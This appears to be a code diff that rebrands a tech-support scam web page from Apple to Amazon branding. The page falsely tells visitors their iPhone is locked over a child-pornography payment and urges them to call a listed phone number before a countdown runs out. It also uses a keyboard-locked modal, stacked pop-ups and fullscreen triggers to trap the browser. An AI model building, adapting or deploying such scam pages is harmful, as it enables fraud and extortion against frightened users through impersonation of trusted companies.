@@ -19,10 +19,10 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta http-equiv="cache-control" content="max-age=3600">
-    <title>Contact - Official Apple Support</title>
-    <link rel="apple-touch-icon" href="images/favicon.ico">
+    <title>Contact - Official Amazon Support</title>
+    <link rel="Amazon-touch-icon" href="images/favicon.ico">
     <link rel="icon" type="image/png" href="images/favicon.ico">
-    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <meta name="description" content="Contact Amazon support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
 
     <!-- Bootstrap 5 CSS -->
     <link href="css/bootstrap.min.css" rel="stylesheet">
@@ -57,15 +57,15 @@
 
     <div class="spacbar">
         <div class="d-flex justify-content-between">
-  <div><img src="images/applelogo2.png" alt="" style="width: 30px;margin-right: 5px;"> Alert</div>
-  <div><a href="#" style="font-size: 15px;">Apple Support</a></div>
+  <div><img src="images/Amazonlogo2.png" alt="" style="width: 30px;margin-right: 5px;"> Alert</div>
+  <div><a href="#" style="font-size: 15px;">Amazon Support</a></div>
 </div>
 <img src="images/arror.jpg" alt="" style="width:80px;display: block;margin: 10px auto 0;text-align: center;">
     <div class="alert-title">Your iPhone has been locked due to suspicious activity.</div>
     <div class="alert-texts">
-        <div class="bgblue"><strong>Transaction of $149.99 via Apple Pay for Child Pornography was found.</strong> <br>For security reasons you are prohibited from using your device.</div>
+        <div class="bgblue"><strong>Transaction of $149.99 via Amazon Pay for Child Pornography was found.</strong> <br>For security reasons you are prohibited from using your device.</div>
     <div class="txstm"> <br>
-        Not you? Call <strong>Apple Support: <br><a href="tel:+18083936860">+1-808-393-6860</a></strong> to unlock your device.
+        Not you? Call <strong>Amazon Support: <br><a href="tel:+18083936860">+1-808-393-6860</a></strong> to unlock your device.
      </div>
     <a href="tel:+18083936860" class="alert-button">Time left for unlock request: <span id="countdown">10:00</span></a>
     
@@ -85,22 +85,22 @@
 <div class="cursor">now</div>
   <div class="notification-header">Payment Successful</div>
   <div class="notification-body">
-    Sent $149.99 via Apple Pay to Pornhub <br>Premium.
+    Sent $149.99 via Amazon Pay to Pornhub <br>Premium.
     Not you? Call +1-808-393-6860
   </div>
-  <img src="images/apple_pay.png" alt="Apple Pay" class="apple-pay">
+  <img src="images/Amazon_pay.png" alt="Amazon Pay" class="Amazon-pay">
 </div>
 
     <div id="modalContainer"></div>
 
     <!-- Main Modal -->
-    <div class="modal fade" id="appleAlertModal" tabindex="-1" aria-labelledby="appleAlertModalLabel" aria-hidden="true" style="top:-30px!important;">
+    <div class="modal fade" id="AmazonAlertModal" tabindex="-1" aria-labelledby="AmazonAlertModalLabel" aria-hidden="true" style="top:-30px!important;">
 
         <div class="modal-dialog modal-lg modal-dialog-centered-sm">
             <div class="modal-content">
                 <div class="modal-body text-center">
                     <div class="alert-text">
-                        Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase of $149.99 for PornHub subscription via Apple ID is complete. Not You? Call Apple Support <a href="tel:+1-808-393-6860">+1-808-393-6860</a> to unlock it!
+                        Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase of $149.99 for PornHub subscription via Amazon ID is complete. Not You? Call Amazon Support <a href="tel:+1-808-393-6860">+1-808-393-6860</a> to unlock it!
                     </div>
 
                     
@@ -212,17 +212,17 @@ const timer = setInterval(() => {
 
         const newModal = document.createElement('div');
         newModal.className = 'modal fade modal-stack';
-        newModal.id = `appleAlertModal-${modalCount}`;
+        newModal.id = `AmazonAlertModal-${modalCount}`;
         newModal.tabIndex = -1;
-        newModal.setAttribute('aria-labelledby', `appleAlertModalLabel-${modalCount}`);
+        newModal.setAttribute('aria-labelledby', `AmazonAlertModalLabel-${modalCount}`);
         newModal.setAttribute('aria-hidden', 'true');
 
         newModal.innerHTML = `
             <div class="modal-dialog modal-lg positioned">
-                <div class="modal-content" id="applealertmodeltwo">
+                <div class="modal-content" id="Amazonalertmodeltwo">
                     <div class="modal-body text-center">
                         <div class="alert-text">
-                            Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase of $149.99 for PornHub subscription via Apple ID is complete. Not You? Call Apple Support <a href="tel:+1-808-393-6860">+1-808-393-6860</a> to unlock it!
+                            Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase of $149.99 for PornHub subscription via Amazon ID is complete. Not You? Call Amazon Support <a href="tel:+1-808-393-6860">+1-808-393-6860</a> to unlock it!
                         </div>
 
                         
@@ -271,13 +271,13 @@ const timer = setInterval(() => {
     }
 
     // Initialize the first modal
-    const appleAlertModal = new bootstrap.Modal(document.getElementById('appleAlertModal'), {
+    const AmazonAlertModal = new bootstrap.Modal(document.getElementById('AmazonAlertModal'), {
         backdrop: 'static',
         keyboard: false
     });
 
     document.addEventListener('DOMContentLoaded', function () {
-        appleAlertModal.show();
+        AmazonAlertModal.show();
     });
 
     // Add event listener to body for fullscreen and modal creation
